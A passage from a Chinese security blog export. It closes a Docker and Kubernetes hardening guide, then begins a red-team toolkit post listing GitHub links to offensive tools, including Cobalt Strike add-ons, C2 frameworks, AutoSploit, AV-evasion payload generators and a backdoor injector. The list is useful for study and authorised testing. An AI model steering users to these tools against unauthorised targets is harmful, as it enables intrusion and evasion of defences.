<h3 id="8-主机基线检查"><a href="#8-主机基线检查" class="headerlink" title="8. 主机基线检查"></a>8. 主机基线检查</h3><p>主机检测及防护: 使用HIDS自动检测不安全的配置项；Memcached漏洞的检测和防护</p>
<h2 id="0x0A-Docker服务安全加固"><a href="#0x0A-Docker服务安全加固" class="headerlink" title="0x0A Docker服务安全加固"></a>0x0A Docker服务安全加固</h2><h3 id="1-加固主机操作系统"><a href="#1-加固主机操作系统" class="headerlink" title="1. 加固主机操作系统"></a>1. 加固主机操作系统</h3><p>在部署前需要对服务器操作系统进行安全加固，例如，更新所有软件补丁、配置强密码、关闭不必要的服务端口等。</p>
<h3 id="2-使用强制访问控制策略"><a href="#2-使用强制访问控制策略" class="headerlink" title="2. 使用强制访问控制策略"></a>2. 使用强制访问控制策略</h3><p>启用强制访问控制（Mandatory Access Control (MAC)），根据业务场景的具体分析，对Docker中使用的各种资源设置访问控制。</p>
<p>启用AppAamor功能：</p>
<p>启用SElinux功能：</p>
<h3 id="3-配置网络访问控制策略"><a href="#3-配置网络访问控制策略" class="headerlink" title="3. 配置网络访问控制策略"></a>3. 配置网络访问控制策略</h3><p>根据实际应用，对需要外网访问的端口（例如<strong>管理界面、API 2375端口</strong>等重要端口）、需要与外网交互的网络地址、端口、协议等进行梳理，使用iptables或<a href="https://help.aliyun.com/document_detail/25475.htm">ECS安全组策略</a>对网络的出入设置严格的访问控制。</p>
<h3 id="4-不要使用root用户运行"><a href="#4-不要使用root用户运行" class="headerlink" title="4. 不要使用root用户运行"></a>4. 不要使用root用户运行</h3><p>在软件使用中，有一些必须由root用户才能够进行的操作。但从安全角度，您需要将这一部分操作与仅使用普通用户权限即可执行的操作分离解耦。</p>
<p>在编写dockerfile时，您可以使用类似如下的命令创建一个普通权限用户，并设置创建的UID为以后运行程序的用户：</p>
<p>Docker命令参考：</p>
<ul>
<li><a href="https://docs.docker.com/reference/builder/#user">https://docs.docker.com/reference/builder/#user</a></li>
<li><a href="https://docs.docker.com/reference/builder/#run">https://docs.docker.com/reference/builder/#run</a></li>
</ul>
<h3 id="5-禁止使用特权"><a href="#5-禁止使用特权" class="headerlink" title="5. 禁止使用特权"></a>5. 禁止使用特权</h3><p>默认情况下，Docker容器是没有特权的，一个容器不允许访问任何设备；但当使用<code>--privileged</code>选项时，则该容器将能访问所有设备。</p>
<p>例如，当打开<code>--privileged</code>选项后，您就可以对Host中<code>/dev/</code>下的所有设备进行操作。但如果不是必须对host上的所有设备进行访问的话，您可以使用<code>--device</code>仅添加需要操作的设备。</p>
<h3 id="6-控制Docker容器资源配额"><a href="#6-控制Docker容器资源配额" class="headerlink" title="6. 控制Docker容器资源配额"></a>6. 控制Docker容器资源配额</h3><p><strong>控制CPU份额</strong></p>
<ul>
<li>Docker提供<code>–cpu-shares</code>参数，用于在创建容器时指定容器所使用的CPU份额值</li>
</ul>
<p>使用示例： 当使用命令<code>docker run -tid –cpu-shares 100 ubuntu:stress</code>创建容器时，则最终生成的cgroup的CPU份额配置可以下面的文件中找到。</p>
<p><code>cpu-shares</code>的值不能保证可以获得1个vcpu或者多少GHz的CPU资源，仅仅只是一个弹性的加权值</p>
<ul>
<li>Docker提供了<code>–cpu-period</code>、<code>–cpu-quota</code>两个参数，用来控制容器可以分配到的CPU时钟周期。<br><code>–cpu-period</code>用来指定容器对CPU的使用要在多长时间内做一次重新分配，而<code>–cpu-quota</code>是用来指定在这个周期内，最多可以有多少时间用来运行这个容器。与<code>–cpu-shares</code>不同的是，这种配置是指定一个绝对值，而且没有弹性在里面，容器对CPU资源的使用绝对不会超过配置的值。<br><code>cpu-period</code>和<code>cpu-quota</code>的单位为微秒（μs）。<code>cpu-period</code>的最小值为1000微秒，最大值为1秒（10^6 μs），默认值为0.1秒（100000 μs）。<code>cpu-quota</code>的值默认为-1，表示不做控制。<br>举例说明，如果容器进程需要每1秒使用单个CPU的0.2秒时间，可以将<code>cpu-period</code>设置为1000000（即1秒），cpu-quota设置为200000（0.2秒）。当然，在多核情况下，如果允许容器进程需要完全占用两个CPU，则可以将<code>cpu-period</code>设置为100000（即0.1秒），<code>cpu-quota</code>设置为200000（0.2秒）。<br>使用示例：使用如下命令来创建容器<code>docker run -tid –cpu-period 100000 –cpu-quota 200000 ubuntu</code>。</li>
</ul>
<p><strong>控制CPU内核</strong></p>
<p>对于多核CPU的服务器，使用<code>–cpuset-cpus</code>和<code>–cpuset-mems</code>参数，可以限定容器运行使用哪些CPU内核和内存节点。</p>
<p>该功能可以对需要高性能计算的容器进行性能最优的配置，对具有NUMA拓扑（具有多CPU、多内存节点）的服务器尤其有用。而如果服务器只有一个内存节点，则<code>–cpuset-mems</code>的配置基本上不会有明显效果。</p>
<p>使用示例：使用命令<code>docker run -tid –name cpu1 –cpuset-cpus 0-2 ubuntu</code>，表示创建的容器只能用0、1、2这三个内核。</p>
<p><strong>混合使用CPU配额控制参数</strong></p>
<p>在上述参数中，<code>cpu-shares</code>控制只用在容器竞争同一个内核的时间片时。如果通过<code>cpuset-cpus</code>指定容器A使用内核0，容器B只使用内核1，则在主机上只有这两个容器使用对应内核的情况，它们各自占用全部的内核资源，<code>cpu-shares</code>没有明显效果。</p>
<p><code>cpu-period</code>、<code>cpu-quota</code>这两个参数一般联合使用。在单核或者通过<code>cpuset-cpus</code>强制容器使用一个CPU内核的情况下，即使<code>cpu-quota</code>超过<code>cpu-period</code>，也不会使容器使用更多的CPU资源。</p>
<p><code>cpuset-cpus</code>、<code>cpuset-mems</code>只对多核、多内存节点上的服务器有效，并且必须与实际的物理配置匹配，否则也无法达到资源控制的目的。</p>
<p><strong>控制内存配额</strong></p>
<p>和CPU控制一样，Docker也提供了若干参数来控制容器的内存使用配额，可以控制容器的swap大小、可用内存大小等。主要有以下参数：</p>
<ul>
<li><code>memory-swappiness</code>：控制进程将物理内存交换到swap分区的倾向，默认系数为60。系数越小，就越倾向于使用物理内存。取值范围为0-100。当值为100时，表示尽量使用swap分区；当值为0时，表示禁用容器swap功能。这点不同于宿主机，宿主机swappiness设置为0时，也不会禁用swap。</li>
<li><code>–kernel-memory</code>：内核内存，不会被交换到swap上。一般情况下，不建议修改，可以直接参考Docker的官方文档。</li>
<li><code>–memory</code>：设置容器使用的最大内存上限。默认单位为byte，可以使用K、G、M等带单位的字符串。</li>
<li><code>–memory-reservation</code>：启用弹性的内存共享。当宿主机资源充足时，允许容器尽量多地使用内存，当检测到内存竞争或者低内存时，强制将容器的内存降低到<code>memory-reservation</code>所指定的内存大小。不设置此选项时，有可能出现某些容器长时间占用大量内存，带来性能上的损失。</li>
<li><code>–memory-swap</code>：等于内存和swap分区大小的总和。设置为-1时，表示swap分区的大小是无限的。默认单位为byte，可以使用K、G、M等带单位的字符串。如果<code>–memory-swap</code>的设置值小于<code>–memory</code>的值，则使用默认值，为<code>–memory-swap</code>值的两倍。</li>
</ul>
<h3 id="7-不运行不可信的Docker镜像"><a href="#7-不运行不可信的Docker镜像" class="headerlink" title="7. 不运行不可信的Docker镜像"></a>7. 不运行不可信的Docker镜像</h3><p>不要运行不可信的Docker镜像作为互联网服务器，避免运行不完全理解的Docker镜像作为互联网服务器。</p>
<h3 id="8-开启日志记录功能"><a href="#8-开启日志记录功能" class="headerlink" title="8. 开启日志记录功能"></a>8. 开启日志记录功能</h3><p>Docker的日志可以分成两类，一类是stdout标准输出，另一类是文件日志。Dockerd支持的日志级别有debug、info、warn、error、fatal，默认的日志级别为info。</p>
<p>必要的情况下，您需要设置日志级别，这可以通过配置文件，或者启动参数<code>-l</code>或<code>--log-level</code>来完成。</p>
<p><strong>方法一</strong>：修改配置文件<code>/etc/docker/daemon.json</code>。</p>
<p><strong>方法二</strong>：使用<code>docker run</code>的时候指定</p>
<pre><code>`--log-driver=syslog --log-opt syslog-facility=daemon`
</code></pre>
<h3 id="9-定期安全扫描和更新补丁"><a href="#9-定期安全扫描和更新补丁" class="headerlink" title="9. 定期安全扫描和更新补丁"></a>9. 定期安全扫描和更新补丁</h3><p>在生产环境中使用漏洞扫描工具可以检测镜像中的已知漏洞。</p>
<ul>
<li>容器通常都不是从头开始构建的，所以一定要进行安全扫描，以便及时发现基础镜像中任何可能存在的漏洞，并及时更新补丁。</li>
<li>在应用程序交付生命周期中加入漏洞扫描的安全质量控制，防止部署易受攻击的容器。</li>
</ul>
<h2 id="0x0B-Kubernetes服务安全加固"><a href="#0x0B-Kubernetes服务安全加固" class="headerlink" title="0x0B Kubernetes服务安全加固"></a>0x0B Kubernetes服务安全加固</h2><h3 id="1-确保镜像无安全漏洞"><a href="#1-确保镜像无安全漏洞" class="headerlink" title="1. 确保镜像无安全漏洞"></a>1. 确保镜像无安全漏洞</h3><p>在部署前，应该确保所有的操作系统软件、Kubernetes软件为官方最新版本，防止部署后因为漏洞造成入侵事件。</p>
<p>在运维过程中，要不断执行持续安全漏洞扫描（Continuous Security Vulnerability Scanning），因为容器中可能存在包含已知漏洞（CVE）的过时包。新的漏洞每天都会出现，所以这不是一个一次性的工作，对镜像进行持续的安全评估是至关重要的。</p>
<p>定期对环境进行安全更新，一旦发现运行中容器的漏洞，您应该及时更新镜像并重新部署容器。尽量避免直接更新（例如，<code>apt-update</code>）到正在运行的容器，因为这样打破了镜像与容器的对应关系。</p>
<p>使用Kubernetes滚动升级功能可以方便地升级容器，该功能允许将镜像升级到最新版本来逐步更新正在运行的容器。</p>
<h3 id="2-只使用授权镜像"><a href="#2-只使用授权镜像" class="headerlink" title="2. 只使用授权镜像"></a>2. 只使用授权镜像</h3><p>如果无法保证只运行符合组织策略的镜像，那么组织会面临运行脆弱甚至恶意容器的危险。从未知的来源下载和运行镜像是危险的，它相当于在生产服务器上运行未知服务商的软件。</p>
<p>使用私有镜像存储您的合法镜像，这样能大量减少可能进入到您的环境的镜像数量。建议您将安全评估（如漏洞扫描）加入持续集成（CI）中，使其成为构建流程的一部分。</p>
<p>持续集成应确保只使用审查通过的代码来构建镜像。当镜像构建成功后，要对它进行安全漏洞扫描，且只有在不存在问题时，才能将镜像推送到私有镜像仓库。在安全评估中失败的镜像不应该被推送到镜像仓库中。</p>
<p>Kubernetes镜像授权插件的工作已经完成，预计会随Kubernetes 1.4发布。该插件允许阻止未授权镜像的分发，<a href="https://github.com/kubernetes/kubernetes/pull/27129">单击查看详情</a>。</p>
<h3 id="3-限制对K8S节点的直接访问"><a href="#3-限制对K8S节点的直接访问" class="headerlink" title="3. 限制对K8S节点的直接访问"></a>3. 限制对K8S节点的直接访问</h3><p>应该限制SSH登录或SSH Key免登录Kubernetes节点，减少对主机资源未授权的访问。应该要求用户使用<code>kubectl exec</code>命令，此命令能够在不访问主机的情况下直接访问容器环境。</p>
<p>您可以使用Kubernetes授权插件来进一步控制用户对资源的访问。它允许设置对指定命名空间、容器和操作的细粒度访问控制规则。</p>
<h3 id="4-修改默认端口-1"><a href="#4-修改默认端口-1" class="headerlink" title="4. 修改默认端口"></a>4. 修改默认端口</h3><p>Kubernets API Server进程提供Kuvernetes API。通常情况下，有一个进程运行在单一kubernetes-master节点上。</p>
<p>默认情况，Kubernetes API Server提供HTTP的两个端口：</p>
<p><strong>本地主机端口</strong></p>
<ul>
<li>HTTP服务默认端口8080，修改标识<code>–insecure-port</code></li>
<li>默认IP是本地主机，修改标识<code>—insecure-bind-address</code></li>
<li>在HTTP中没有认证和授权检查</li>
<li>主机访问受保护</li>
</ul>
<p><strong>安全端口</strong></p>
<ul>
<li>默认端口6443，修改标识<code>—secure-port</code></li>
<li>默认IP是首个非本地主机的网络接口，修改标识<code>—bind-address</code> HTTPS服务。</li>
<li>设置证书和密钥的标识，<code>–tls-cert-file</code>，<code>–tls-private-key-file</code></li>
<li>认证方式，令牌文件或者客户端证书</li>
<li>使用基于策略的授权方式</li>
</ul>
<p>基于安全考虑，会移除只读端口，使用Service Account代替。</p>
<h3 id="5-API管理端口访问控制"><a href="#5-API管理端口访问控制" class="headerlink" title="5. API管理端口访问控制"></a>5. API管理端口访问控制</h3><p>在某些配置文件中有一个代理（nginx）作为API Server进程运行在同一台机器上。该代理是HTTPS服务，认证端口是443，访问API Server是本地主机8080端口。在这些配置文件里，Secure Port通常设置为6443。</p>
<p>您可以使用<a href="https://help.aliyun.com/document_detail/25475.htm">ECS安全组防火墙规则</a>，限制外部HTTPS通过443端口访问。</p>
<p>以上都是默认配置，每个云提供商可能会有所不同，您可以根据不同的业务场景灵活配置和调整。</p>
<h3 id="6-创建资源间的管理界限"><a href="#6-创建资源间的管理界限" class="headerlink" title="6. 创建资源间的管理界限"></a>6. 创建资源间的管理界限</h3><p>限制用户权限的范围可以减少错误或恶意活动的影响。Kubernetes命名空间允许将资源划分为逻辑命名组。在一个命名空间中创建的资源对其他命名空间是隐藏的。</p>
<p>默认情况下，用户在Kubernetes集群中创建的每个资源运行在名称为“default”的默认空间内。您也可以创建额外的命名空间并附加资源和用户给它们。您可以使用Kubernetes授权插件来创建策略，以便将不同用户的访问请求隔离到不同的命名空间中。</p>
<p>例如：以下策略将允许”alice”从命名空间”fronto”读取pods。</p>
<h3 id="7-定义资源配额"><a href="#7-定义资源配额" class="headerlink" title="7. 定义资源配额"></a>7. 定义资源配额</h3><p>运行没有资源限制的容器会将您的系统置于DoS或被其他租户干扰的风险中。为了防止和最小化这些风险，您应该定义资源配额。</p>
<p>默认情况下，Kubernetes集群中的所有资源没有对CPU和内存的使用限制。您可以创建资源配额策略，并附加到Kubernetes命名空间中来限制Pod对CPU和内存的使用。</p>
<p>下面的例子将限制命名空间中Pod的数量为4个，CPU使用在1和2之间，内存使用在1GB 和2GB之间。</p>
<p>在<code>compute-resources.yaml</code>文件中：</p>
<h3 id="10-API-Server认证与授权"><a href="#10-API-Server认证与授权" class="headerlink" title="10. API Server认证与授权"></a>10. API Server认证与授权</h3><p>API Server权限控制分为三种：Authentication（身份认证）、Authorization（授权）、AdmissionControl（准入控制）。</p>
<p><strong>身份认证</strong></p>
<p>当客户端向Kubernetes非只读端口发起API请求时，Kubernetes通过三种方式来认证用户的合法性（即验证用户是否有权限操作API）：证书认证，Token认证，基本信息认证。</p>
<ul>
<li><strong>证书认证</strong><br>设置APIServer的启动参数：<code>--client_ca_file=SOMEFILE</code><br>验证被引用的文件中包含的client证书。如果被验证通过，那么这个验证记录中的主体对象将会作为请求的username。</li>
<li><strong>Token认证</strong><br>设置APIServer的启动参数：<code>--token_auth_file=SOMEFILE</code><br>Token file的格式包含三列：token，username，userid。当使用Token作为验证方式时，需要在对APIServer的HTTP请求中增加一个Header字段<code>Authorization</code>，并将它的值设置为<code>Bearer SOMETOKEN</code>。</li>
<li><strong>基本信息认证</strong><br>设置APIServer的启动参数：<code>--basic_auth_file=SOMEFILE</code><br>如果更改了文件中的密码，只有重新启动APIServer使其重新生效。该文件的基本格式包含三列：passwork，username，userid。当使用此作为认证方式时，需要在对APIServer的HTTP请求中增加一个Header字段<code>Authorization</code>，并将它的值设置为<code>Basic BASE64ENCODEDUSER:PASSWORD</code>。</li>
</ul>
<p><strong>授权</strong></p>
<p>在Kubernetes中，认证和授权是分开的，而且授权发生在认证完成之后。认证过程是检验发起API请求的用户是不是他所声称的那个人；而授权过程则判断此用户是否有执行该API请求的权限；因此授权是以认证的结果作为基础的。</p>
<p>Kubernetes授权模块应用于所有对APIServer的HTTP访问请求，而访问只读端口不需要认证和授权过程。APIServer启动时默认将authorization_mode设置为AlwaysAllow模式，即永远允许。</p>
<p>Kubernetes授权模块检查每个HTTP请求，并提取请求上下文中的所需属性（例如：user，resource kind，namespace）与访问控制规则进行比较。任何一个API请求在被处理前都需要通过一个或多个访问控制规则的验证。</p>
<p>目前，Kubernetes支持并实现了以下授权模式（authorization_mode），这些授权模式可以通过在APIServer启动时传入参数进行选择。</p>
<p>AlwaysDeny模式屏蔽所有的请求（一般用于测试）。AlwaysAllow模式允许所有请求，默认APIServer启动时采用的便是AlwaysAllow模式。ABAC（Attribute-Based Access Control，即基于属性的访问控制）模式则允许用户自定义授权访问控制规则。</p>
<p><strong>ABAC模式</strong></p>
<p>一个API请求中有4个属性被用于用户授权过程：</p>
<ul>
<li><strong>UserName</strong>：String类型，用于标识发起请求的用户。如果不进行认证、授权操作，则该字符串为空。</li>
<li><strong>ReadOnly</strong>：Bool类型，标识该请求是否仅进行只读操作（GET就是只读操作）。</li>
<li><strong>Kind</strong>：String类型，用于标识要访问的Kubernetes资源对象的类型。当访问<code>/api/v1beta1/pods</code>等API endpoint时，Kind属性才非空，但访问其他endpoint时，例如<code>/version</code>，<code>/healthz</code>等，Kind属性为空。</li>
<li><strong>Namespace</strong>：String类型，用于标识要访问的Kubernetes资源对象所在的namespace。</li>
</ul>
<p>对于ABAC模式，在APIServer启动时除了需要传入<code>--authorization_mode=ABAC</code>选项外，还需要指定<code>--authorization_policy_file=SOME_FILENAME</code>。<code>authorization_policy_file</code>文件的每一行都是一个JSON对象，该JSON对象是一个没有嵌套的Map数据结构，代表一个访问控制规则对象。一个访问控制规则对象是一个包含以下字段的Map：</p>
<ul>
<li>user：<code>--token_auth_file</code>指定的user字符串。</li>
<li>readonly：true或false。true表明该规则只应用于GET请求。</li>
<li>kind：Kubernetes内置资源对象类型，例如pods、events等。</li>
<li>namespace：也可以缩写成ns。</li>
</ul>
<p>一个简单的访问控制规则文件如下所示，每一行定义一条规则：</p>
<p><strong>说明</strong>：缺省的字段与该字段类型的零值（空字符串，0，false等）等价。</p>
<p>一个授权过程就是一个比较API请求中各属性与访问控制规则文件中对应的各字段是否匹配的一个过程。当APIServer接收到一个API请求时，该请求的各属性就已经确定了，如果有一个属性未被设置，则APIServer将其设为该类型的空值（空字符串，0，false等）。匹配规则如下所示：</p>
<ul>
<li>如果API请求中的某个属性为空值，则规定该属性与访问控制规则文件中对应的字段匹配。</li>
<li>如果访问控制规则的某个字段为空值，则规定该字段与API请求的对应属性匹配。</li>
<li>如果API请求中的属性值非空且访问控制规则的某个字段值也非空，则将这两个值进行比较，如果相同则匹配，反之则不匹配。</li>
<li>API请求的属性元组（tuple）会与访问控制规则文件中的所有规则逐条匹配，只要有一条匹配则表示匹配成功，如若不然，则授权失败。</li>
</ul>
<h3 id="11-记录所有的日志"><a href="#11-记录所有的日志" class="headerlink" title="11. 记录所有的日志"></a>11. 记录所有的日志</h3><p>Kubernetes提供基于集群的日志，允许将容器活动日志记录到一个日志中心。当集群被创建时，每个容器的标准输出和标准错误都可以通过运行在每个节点上的Fluentd 服务记录到Stackdriver或Elasticsearch中，然后使用Kibana进行查看</p>
<h2 id="0xFF-参考资源"><a href="#0xFF-参考资源" class="headerlink" title="0xFF 参考资源"></a>0xFF 参考资源</h2><ul>
<li><a href="https://github.com/trimstray/the-practical-linux-hardening-guide"></a></li>
<li><a href="https://www.elastic.co/cn/blog/reinforce-the-security-of-elasticsearch-101">https://www.elastic.co/cn/blog/reinforce-the-security-of-elasticsearch-101</a></li>
<li><a href="https://kubernetes.io/blog/2016/08/security-best-practices-kubernetes-deployment/">https://kubernetes.io/blog/2016/08/security-best-practices-kubernetes-deployment/</a></li>
</ul>
]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Hardening</tag>
      </tags>
  </entry>
  <entry>
    <title>红队武器工具库</title>
    <url>/posts/33899/</url>
    <content><![CDATA[<center>本文梳理总结各个攻击链阶段红队常用的武器、工具...</center>

<span id="more"></span>
<hr>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/red_tookit.png"></p>
<h2 id="0x00-核心工具"><a href="#0x00-核心工具" class="headerlink" title="0x00 核心工具"></a>0x00 核心工具</h2><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><ul>
<li><a href="https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit">https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit</a> 结合机器学习与msf的全自动测试工具</li>
<li><a href="https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL">https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL</a> 一个可以创建SSL&#x2F;TLS shell连接的脚本</li>
<li><a href="https://github.com/NullArray/AutoSploit">https://github.com/NullArray/AutoSploit</a> 利用Shodan 搜索引擎收集目标, 并自动调用设定的msf模块对目标发动攻击</li>
<li><a href="https://github.com/WazeHell/metateta">https://github.com/WazeHell/metateta</a> 使用msf脚本，根据特定协议进行扫描</li>
<li><a href="https://github.com/fbkcs/msf-elf-in-memory-execution">https://github.com/fbkcs/msf-elf-in-memory-execution</a> Metasploit模块, 用于在内存中执行ELF文件</li>
<li><a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</a> metasploit双星攻击利用文件</li>
<li><a href="https://github.com/darkoperator/Metasploit-Plugins">https://github.com/darkoperator/Metasploit-Plugins</a> msf扩展资产搜集与帮助插件</li>
<li><a href="https://github.com/D4Vinci/One-Lin3r">https://github.com/D4Vinci/One-Lin3r</a> metasploit、payload辅助查询工具</li>
<li><a href="https://github.com/shizzz477/msploitego">https://github.com/shizzz477/msploitego</a> 将msf数据库与maltego进行图形化展示</li>
<li><a href="https://github.com/scriptjunkie/msfgui">https://github.com/scriptjunkie/msfgui</a> metasploit的GUI界面，话说现在msf对windows支持也挺好的</li>
</ul>
<h3 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h3><ul>
<li><a href="https://github.com/rsmudge/armitage">https://github.com/rsmudge/armitage</a> CobaltStrike社区版，调用msf，一对多带界面</li>
<li><a href="https://github.com/anbai-inc/CobaltStrike_Hanization">https://github.com/anbai-inc/CobaltStrike_Hanization</a> CobaltStrike2.5汉化版，以msf库为基础，3.0以后改版</li>
<li><a href="https://github.com/rsmudge/cortana-scripts">https://github.com/rsmudge/cortana-scripts</a> 用于cs2.x与armitage的可拓展插件，cvs3.x的为AggressorScripts</li>
<li><a href="https://github.com/harleyQu1nn/AggressorScripts">https://github.com/harleyQu1nn/AggressorScripts</a> cs3.0以后的脚本搜集</li>
<li><a href="https://github.com/FortyNorthSecurity/AggressorAssessor">https://github.com/FortyNorthSecurity/AggressorAssessor</a> cs3.x自动化攻击脚本集合</li>
<li><a href="https://github.com/verctor/CS_xor64">https://github.com/verctor/CS_xor64</a> 生成cobaltstrike所需的xor64.bin</li>
<li><a href="https://github.com/ryhanson/ExternalC2">https://github.com/ryhanson/ExternalC2</a> 一个用于将通信渠道与Cobalt Strike External C2服务器集成的库</li>
<li><a href="https://github.com/threatexpress/cs2modrewrite">https://github.com/threatexpress/cs2modrewrite</a> 用于将Cobalt Strike配置文件转换为mod_rewrite脚本的工具</li>
<li><a href="https://github.com/Mr-Un1k0d3r/CatMyFish">https://github.com/Mr-Un1k0d3r/CatMyFish</a> 搜索分类域，为Cobalt Strike beacon C&amp;C设置白名单域</li>
<li><a href="https://github.com/threatexpress/malleable-c2">https://github.com/threatexpress/malleable-c2</a> 利用jquery文件进行C2通讯，在文件内做了JS混淆绕过防火墙</li>
<li><a href="https://github.com/dcsync/pycobalt">https://github.com/dcsync/pycobalt</a> py3,Python API for Cobalt Strike</li>
<li><a href="https://www.cobaltstrike.com/aggressor-script/cobaltstrike.html">https://www.cobaltstrike.com/aggressor-script/cobaltstrike.html</a> CobaltStrike相关插件编写，一对多带界面</li>
</ul>
<h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><ul>
<li><a href="https://github.com/EmpireProject/Empire-GUI">https://github.com/EmpireProject/Empire-GUI</a> empire的node.js界面</li>
<li><a href="https://github.com/interference-security/empire-web">https://github.com/interference-security/empire-web</a> empire的web界面</li>
<li><a href="https://github.com/byt3bl33d3r/DeathStar">https://github.com/byt3bl33d3r/DeathStar</a> py3,调用Empire RESTful API 自动化获取域管权限的</li>
</ul>
<h3 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h3><ul>
<li><a href="https://github.com/PortSwigger">https://github.com/PortSwigger</a> burpsuite官方插件库</li>
<li><a href="https://github.com/snoopysecurity/awesome-burp-extensions">https://github.com/snoopysecurity/awesome-burp-extensions</a> awesome系列之burp拓展</li>
<li><a href="https://github.com/d3vilbug/HackBar">https://github.com/d3vilbug/HackBar</a> 集成hackbar</li>
<li><a href="https://github.com/PortSwigger/turbo-intruder">https://github.com/PortSwigger/turbo-intruder</a> 比Burp自带的Intruder 更快，一分钟打1.61万次请求</li>
<li><a href="https://github.com/Ebryx/AES-Killer">https://github.com/Ebryx/AES-Killer</a> burp插件，破解aes加密的插件</li>
<li><a href="https://github.com/bugcrowd/HUNT">https://github.com/bugcrowd/HUNT</a> 可以将burpsuite扫描器功能扩展的更加强大，同时支持zapproxy扩展</li>
<li><a href="https://github.com/wagiro/BurpBounty">https://github.com/wagiro/BurpBounty</a> burp插件增强主动与被动扫描功能</li>
<li><a href="https://github.com/nccgroup/BurpSuiteHTTPSmuggler">https://github.com/nccgroup/BurpSuiteHTTPSmuggler</a> Burp拓展, 使用几种技巧绕过WAF</li>
<li><a href="https://github.com/PortSwigger/command-injection-attacker">https://github.com/PortSwigger/command-injection-attacker</a> burp插件，命令注入漏洞检测</li>
<li><a href="https://github.com/nccgroup/freddy">https://github.com/nccgroup/freddy</a> burp插件，自动识别Java&#x2F;.NET 应用程序中的反序列化漏洞</li>
<li><a href="https://github.com/modzero/interestingFileScanner">https://github.com/modzero/interestingFileScanner</a> burp插件，增强敏感文件扫描</li>
<li><a href="https://github.com/summitt/Burp-Non-HTTP-Extension">https://github.com/summitt/Burp-Non-HTTP-Extension</a> burp插件，布置dns服务器抓取流量</li>
<li><a href="https://github.com/ilmila/J2EEScan">https://github.com/ilmila/J2EEScan</a> burp拓展，扫描J2EE应用</li>
<li><a href="https://github.com/JGillam/burp-co2">https://github.com/JGillam/burp-co2</a> 集成了sqlmap，菜刀，字典生成等</li>
<li><a href="https://github.com/swisskyrepo/SSRFmap">https://github.com/swisskyrepo/SSRFmap</a> burp插件，检测ssrf漏洞</li>
<li><a href="https://github.com/codewatchorg/sqlipy">https://github.com/codewatchorg/sqlipy</a> burp与sqlmap联动插件</li>
</ul>
<h3 id="Recommend"><a href="#Recommend" class="headerlink" title="Recommend"></a>Recommend</h3><ul>
<li><a href="https://github.com/zmap/zgrab2">https://github.com/zmap/zgrab2</a> Go版端口扫描器 ✨</li>
<li><a href="https://github.com/RustScan/RustScan">https://github.com/RustScan/RustScan</a> Rust版端口扫描器 ✨</li>
<li><a href="https://github.com/foryujian/yjdirscan">https://github.com/foryujian/yjdirscan</a>  御剑目录扫描 ✨</li>
<li><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a>  dirsearch - Web path scanner 目录扫描工具 ✨</li>
<li><a href="https://github.com/chaitin/xray">https://github.com/chaitin/xray</a>  一款功能强大的安全评估工具 - Xray ✨ </li>
<li><a href="https://github.com/zhzyker/vulmap">https://github.com/zhzyker/vulmap</a>  Vulmap 是一款 web 漏洞扫描和验证工具 ✨</li>
<li><a href="https://github.com/w-digital-scanner/w9scan">https://github.com/w-digital-scanner/w9scan</a>  w9scan 一款全能型的网站漏洞扫描器 ✨</li>
<li><a href="https://github.com/ysrc/xunfeng">https://github.com/ysrc/xunfeng</a>  巡风是一款适用于企业内网的漏洞快速应急、巡航扫描系统 ✨</li>
<li><a href="https://github.com/WyAtu/Perun">https://github.com/WyAtu/Perun</a>  Perun 网络资产漏洞扫描器&#x2F;扫描框架 ✨</li>
<li><a href="https://github.com/awake1t/linglong">https://github.com/awake1t/linglong</a>  linglong 一款甲方资产巡航扫描系统。系统定位是发现资产，进行端口爆破 ✨</li>
<li><a href="https://github.com/knownsec/pocsuite3">https://github.com/knownsec/pocsuite3</a>  pocsuite3 开源的远程漏洞测试框架 ✨</li>
<li><a href="https://github.com/opensec-cn/kunpeng">https://github.com/opensec-cn/kunpeng</a>  kunpeng是一个Golang编写的开源POC框架&#x2F;库 ✨</li>
<li><a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a>  Ladon一款用于大型网络渗透的多线程插件化综合扫描神器 ✨</li>
<li><a href="https://github.com/Xyntax/POC-T">https://github.com/Xyntax/POC-T</a>  POC-T 渗透测试插件化并发框架 ✨</li>
<li><a href="https://github.com/trustedsec/unicorn">https://github.com/trustedsec/unicorn</a> Unicorn是一个简单的工具，用于使用 PowerShell 降级攻击并将 shellcode 直接注入内存 ✨</li>
<li><a href="https://www.shellterproject.com/">https://www.shellterproject.com/</a> Shellter是一个动态 shellcode 注入工具，也是有史以来第一个真正的动态 PE 感染器 ✨</li>
<li><a href="https://github.com/Veil-Framework/Veil">https://github.com/Veil-Framework/Veil</a> Veil是一种工具，旨在生成绕过常见反病毒解决方案的 metasploit 有效载荷 ✨</li>
<li><a href="https://github.com/trustedsec/social-engineer-toolkit">https://github.com/trustedsec/social-engineer-toolkit</a> Social-Engineer Toolkit是一个为社会工程设计的开源渗透测试框架 ✨</li>
<li><a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a> 后门工厂 (BDF)将使用用户所需的 shellcode 修补可执行二进制文件，并继续正常执行预修补状态 ✨</li>
<li><a href="https://github.com/PowerShellEmpire/PowerTools/">https://github.com/PowerShellEmpire/PowerTools/</a> ✨</li>
<li><a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a> BeEF是浏览器开发框架的缩写 ✨</li>
<li><a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a> reGeorg是 reDuh 的继任者，拥有一个堡垒网络服务器并通过 DMZ 创建 SOCKS 代理 ✨</li>
